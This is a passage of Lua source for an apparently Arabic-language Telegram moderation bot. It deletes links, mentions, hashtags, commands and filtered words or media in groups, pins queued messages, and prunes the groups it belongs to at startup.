if database:get(bot_id.."Neverland:Lock:Link"..msg.chat_id_) then
DeleteMessage(result.chat_id_,{[0] = data.message_id_}) 
return false
end 
end
------------------------------------------------------------------------
if text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text and text:match("[Tt].[Mm][Ee]") or text and text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text and text:match("[Tt][Ee][Ll][Ee][Ss][Cc][Oo].[Pp][Ee]") then
if database:get(bot_id.."Neverland:Lock:Link"..msg.chat_id_) then
DeleteMessage(result.chat_id_,{[0] = data.message_id_}) 
return false
end  
end
------------------------------------------------------------------------
if text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text and text:match("[Tt].[Mm][Ee]") or text and text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text and text:match("[Tt][Ee][Ll][Ee][Ss][Cc][Oo].[Pp][Ee]") then
if database:get(bot_id.."Neverland:Lock:Link"..msg.chat_id_) then
DeleteMessage(result.chat_id_,{[0] = data.message_id_}) 
return false
end  
end 
------------------------------------------------------------------------
if text and text:match("[hH][tT][tT][pP][sT]") or text and text:match("[tT][eE][lL][eE][gG][rR][aA].[Pp][Hh]") or text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa].[Pp][Hh]") then
if database:get(bot_id.."Neverland:Lock:Link"..msg.chat_id_) then
DeleteMessage(result.chat_id_,{[0] = data.message_id_}) 
return false
end  
end 
------------------------------------------------------------------------
if text and text:match("(.*)(@)(.*)") then
if database:get(bot_id.."Neverland:Lock:User:Name"..msg.chat_id_) then
DeleteMessage(result.chat_id_,{[0] = data.message_id_}) 
return false
end  
end
------------------------------------------------------------------------
if text and text:match("@") then
if database:get(bot_id.."Neverland:Lock:User:Name"..msg.chat_id_) then
DeleteMessage(result.chat_id_,{[0] = data.message_id_}) 
return false
end  
end 
------------------------------------------------------------------------
if text and text:match("(.*)(#)(.*)") then
if database:get(bot_id.."Neverland:Lock:hashtak"..msg.chat_id_) then
DeleteMessage(result.chat_id_,{[0] = data.message_id_}) 
return false
end  
end 
------------------------------------------------------------------------
if text and text:match("#") then
if database:get(bot_id.."Neverland:Lock:hashtak"..msg.chat_id_) then
DeleteMessage(result.chat_id_,{[0] = data.message_id_}) 
return false
end  
end 
------------------------------------------------------------------------
if text and text:match("/") then
if database:get(bot_id.."Neverland:Lock:Cmd"..msg.chat_id_) then
DeleteMessage(result.chat_id_,{[0] = data.message_id_}) 
return false
end 
end 
if text and text:match("(.*)(/)(.*)") then
if database:get(bot_id.."Neverland:Lock:Cmd"..msg.chat_id_) then
DeleteMessage(result.chat_id_,{[0] = data.message_id_}) 
return false
end 
end
------------------------------------------------------------------------
if text then
local Neverland_Msg = database:sismember(bot_id.."Neverland:List:Filter:text"..result.chat_id_,text) 
if Neverland_Msg then    
Reply_Status(result,result.sender_user_id_,"reply","✦┇الكلمه ممنوعه من المجموعه")  
DeleteMessage(result.chat_id_, {[0] = data.message_id_})     
return false
end
end
if msg.content_.ID == 'MessageAnimation' then    
local Animation_Msg = database:sismember(bot_id.."Neverland:List:Filter:Animation"..result.chat_id_,result.content_.animation_.animation_.persistent_id_) 
if Animation_Msg then    
Reply_Status(result,result.sender_user_id_,"reply","✦┇المتحركه ممنوعه من المجموعه")  
DeleteMessage(result.chat_id_, {[0] = data.message_id_})     
return false
end
end
if msg.content_.ID == 'MessagePhoto' then    
local Photo_Msg = database:sismember(bot_id.."Neverland:List:Filter:Photo"..result.chat_id_,result.content_.photo_.sizes_[1].photo_.persistent_id_) 
if Photo_Msg then    
Reply_Status(result,result.sender_user_id_,"reply","✦┇الصوره ممنوعه من المجموعه")  
DeleteMessage(result.chat_id_, {[0] = data.message_id_})     
return false
end
end
if msg.content_.ID == 'MessageSticker' then    
local Sticker_Msg = database:sismember(bot_id.."Neverland:List:Filter:Sticker"..result.chat_id_,result.content_.sticker_.sticker_.persistent_id_) 
if Sticker_Msg then    
Reply_Status(result,result.sender_user_id_,"reply","✦┇الملصق ممنوع من المجموعه")  
DeleteMessage(result.chat_id_, {[0] = data.message_id_})     
return false
end
end
end
end,nil)
------------------------------------------------------------------------
elseif (data.ID == "UpdateMessageSendSucceeded") then
local msg = data.message_
local text = msg.content_.text_
local Get_Msg_Pin = database:get(bot_id..'Neverland:Msg:Pin:Chat'..msg.chat_id_)
if Get_Msg_Pin ~= nil then
if text == Get_Msg_Pin then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,d) if d.ID == 'Ok' then;database:del(bot_id..'Neverland:Msg:Pin:Chat'..msg.chat_id_);end;end,nil)   
elseif (msg.content_.sticker_) then 
if Get_Msg_Pin == msg.content_.sticker_.sticker_.persistent_id_ then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,d) database:del(bot_id..'Neverland:Msg:Pin:Chat'..msg.chat_id_) end,nil)   
end
end
if (msg.content_.animation_) then 
if msg.content_.animation_.animation_.persistent_id_ == Get_Msg_Pin then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,d) database:del(bot_id..'Neverland:Msg:Pin:Chat'..msg.chat_id_) end,nil)   
end
end
if (msg.content_.photo_) then
if msg.content_.photo_.sizes_[0] then
id_photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[1] then
id_photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[2] then
id_photo = msg.content_.photo_.sizes_[2].photo_.persistent_id_
end	
if msg.content_.photo_.sizes_[3] then
id_photo = msg.content_.photo_.sizes_[3].photo_.persistent_id_
end
if id_photo == Get_Msg_Pin then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,d) database:del(bot_id..'Neverland:Msg:Pin:Chat'..msg.chat_id_) end,nil)   
end
end
end
end
if (data.ID == "UpdateOption" and data.value_.value_ == "Ready") then
print("\27[34m"..[[
>> The Bot is Running
>> Bot source > Neverland
>>Neverland Team > @TEAM_Neverland
>>Source developer > @B333BB

]].."\27[m")
local list = database:smembers(bot_id..'Neverland:UsersBot')  
for k,v in pairs(list) do 
tdcli_function({ID='GetChat',chat_id_ = v},function(arg,data) end,nil) 
end 
local list = database:smembers(bot_id..'Chek:Groups') 
for k,v in pairs(list) do 
tdcli_function({ID='GetChat',chat_id_ = v},function(arg,data)
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusMember" then
tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_=v,user_id_=bot_id,status_={ID = "ChatMemberStatusLeft"},},function(e,g) end, nil) 
database:srem(bot_id..'Chek:Groups',v)  
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusLeft" then
database:srem(bot_id..'Chek:Groups',v)  
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusKicked" then
database:srem(bot_id..'Chek:Groups',v)  
end
if data and data.code_ and data.code_ == 400 then
database:srem(bot_id..'Chek:Groups',v)  
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusEditor" then
database:sadd(bot_id..'Chek:Groups',v)  
end end,nil)
end;end;end